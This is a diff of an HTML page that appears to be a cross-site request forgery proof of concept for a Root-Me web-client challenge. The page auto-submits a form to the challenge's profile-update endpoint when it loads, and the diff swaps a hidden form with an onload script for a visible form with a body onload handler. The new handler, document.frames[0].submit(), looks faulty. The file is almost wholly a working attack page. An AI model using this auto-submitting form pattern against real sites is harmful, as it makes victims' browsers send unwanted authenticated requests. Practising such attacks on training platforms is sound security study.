@@ -1,5 +1,6 @@
 <html>
-  <form id="hiddenForm" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="post" enctype="multipart/form-data" style="display:none;">
+<body onload="document.frames[0].submit()">
+<form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
 		<div class="form-group">
 		<label>Username:</label>
 		<input type="text" name="username" value="test">
@@ -11,11 +12,6 @@
 		</div>
 		<br>	
 		<button type="submit">Submit</button>
-	</form>
-  <script>
-        window.onload = function() {
-            var form = document.getElementById("hiddenForm");
-            form.submit();
-        }
-    </script>
+</form>
+</body>
 </html>
